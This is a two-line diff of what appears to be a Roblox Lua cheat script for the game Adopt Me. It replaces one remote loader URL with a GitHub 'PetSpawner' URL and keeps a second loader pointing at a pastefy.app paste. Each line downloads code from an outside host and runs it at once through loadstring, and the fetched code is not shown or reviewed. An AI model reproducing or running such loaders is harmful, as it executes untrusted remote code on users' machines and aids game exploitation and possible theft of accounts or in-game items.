@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://softprojectsloader.vercel.app/adoptme"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/INF-Hub-PL/AdoptMeSpawner/refs/heads/main/PetSpawner"))()
 loadstring(game:HttpGet("https://pastefy.app/kdaP3kQP/raw"))()
